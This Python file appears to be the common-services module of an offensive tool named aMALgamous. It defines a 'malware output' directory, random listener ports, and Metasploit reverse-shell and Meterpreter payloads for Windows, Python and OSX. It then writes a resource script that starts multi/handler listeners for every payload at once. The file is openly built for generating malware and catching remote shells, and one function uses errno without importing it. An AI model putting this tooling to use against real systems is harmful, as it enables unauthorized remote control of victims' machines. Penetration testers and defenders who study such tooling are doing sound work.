#! /usr/bin/env python3

## File That has all of the common services

import time
import atexit
import readline
import os
import netifaces as nic
import random
import string
import shutil

histfile = os.path.join(os.path.expanduser("~"), ".aMALgamous_history")

try:
    readline.read_history_file(histfile)
    h_len = readline.get_current_history_length()
except FileNotFoundError:
    open(histfile, 'wb').close()
    h_len = 0

def save(prev_h_len, histfile):
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, histfile)
atexit.register(save, h_len, histfile)



class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

#Loopback ip
listener_ip = "127.0.0.1"
#assumed wired interface
interface = "eth0"
#assumed wireless interface
winterface = "wlan0"
#Install location
loc = os.getcwd()
#Malware output file
targetfile = loc + "/aMALgamation/current/autoMAL/"

#Random Port
def randomPort(stringLength=5):
  number = '54321'
  return ''.join(random.choice(number) for i in range(stringLength))



# 32 bit MET Port
METRT32_PORT = randomPort(4)
# 32 bit MET Stageless Port
METRT32_SL_PORT = randomPort(4)
# 64 bit MET Port
METRT64_PORT = randomPort(4)
# 64 bit MET Stageless Port
METRT64_SL_PORT = randomPort(4)
# 32 bit SHELL Port
SHELL32_PORT = randomPort(4)
# 64 bit SHELL Port
SHELL64_PORT = randomPort(4)
# 32 bit SHELL Stageless Port
SHELL32_SL_PORT = randomPort(4)
# 64 bit SHELL Stageless Port
SHELL64_SL_PORT = randomPort(4)
# Python MET Port
METPY_PORT = randomPort(4)
# Python SHELL Port
SHELLPY_PORT = randomPort(4)
# OSX 32 bit SHELL Port
SHELLOS32_PORT = randomPort(4)
# OSX 64 bit SHELL Port
SHELLOS64_PORT = randomPort(4)
# DNS Port
DNSPORT = '53'


# 32 bit MET payload
METRT32_Payload = "windows/meterpreter/reverse_tcp"
# 32 bit MET Stageless payload
METRT32_SL_Payload = "windows/meterpreter_reverse_tcp"
# 64 bit MET payload
METRT64_Payload = "windows/x64/meterpreter/reverse_tcp"
# 64 bit MET Stageless payload
METRT64_SL_Payload = "windows/x64/meterpreter_reverse_tcp"
# 32 bit SHELL payload
SHELL32_Payload = "windows/shell/reverse_tcp"
# 64 bit SHELL payload
SHELL64_Payload = "windows/x64/shell/reverse_tcp"
# 32 bit SHELL Stageless payload
SHELL32_SL_Payload = "windows/shell_reverse_tcp"
# 64 bit SHELL Stageless payload
SHELL64_SL_Payload = "windows/x64/shell_reverse_tcp"
# Python MET payload
METPY_Payload = "python/meterpreter/reverse_tcp"
# Python SHELL payload
SHELLPY_Payload = "python/shell_reverse_tcp"
# OSX 32 bit SHELL payload
SHELLOS32_Payload = "osx/x86/shell_reverse_tcp"
# OSX 64 bit SHELL payload
SHELLOS64_Payload = "osx/x64/shell_reverse_tcp"
# DNS 32 bit SHELL Payload
SHELLDNSWIN = "windows/shell/reverse_tcp_dns"




def archFile():
  # Createing the output file
  if not os.path.exists(targetfile):
    os.makedirs(targetfile)
  # archive the old version
  today = time.strftime("%Y%m%d-%H%M")

  archivefolder = loc + "/aMALgamation/archive" + today
  try:
    os.makedirs(archivefolder)
  except OSError as e:
    if e.errno != errno.EEXIST:
      raise
  files = os.listdir(targetfile)
  for f in files:
      shutil.move(targetfile+f, archivefolder)
  print(bcolors.ERROR + bcolors.BOLD + "\t\tAll content in {0} being moved to {1}\n".format(targetfile, archivefolder) + bcolors.ENDC)

#Random Letter Strings
def randomString(stringLength=6):
  letters = string.ascii_letters
  return ''.join(random.choice(letters) for i in range(stringLength))


def get_local_ip(iface):
  try:
    nic.ifaddresses(iface)
    local_ip = nic.ifaddresses(iface)[2][0]['addr']
    return local_ip
  except:
    pass
def rc_file():
  global listener_ip

  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
  msf_resource_file = open(targetfile + "ALL-Payloads.rc", "w")
  msf_resource_file.write("""use multi/handler
set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false 
exploit -j
""" % (METRT32_Payload, listener_ip, METRT32_PORT, METRT32_SL_Payload, listener_ip,  METRT32_SL_PORT, METRT64_Payload, listener_ip, METRT64_PORT, METRT64_SL_Payload, listener_ip, METRT64_SL_PORT, SHELL32_Payload, listener_ip, SHELL32_PORT, SHELL32_SL_Payload, listener_ip, SHELL32_SL_PORT, SHELL64_Payload, listener_ip, SHELL64_PORT, SHELL64_SL_Payload, listener_ip, SHELL64_SL_PORT, METPY_Payload, listener_ip, METPY_PORT, SHELLPY_Payload, listener_ip, SHELLPY_PORT, SHELLOS32_Payload, listener_ip, SHELLOS32_PORT, SHELLOS64_Payload, listener_ip, SHELLOS64_PORT, SHELLDNSWIN, listener_ip, DNSPORT))
  msf_resource_file.close()
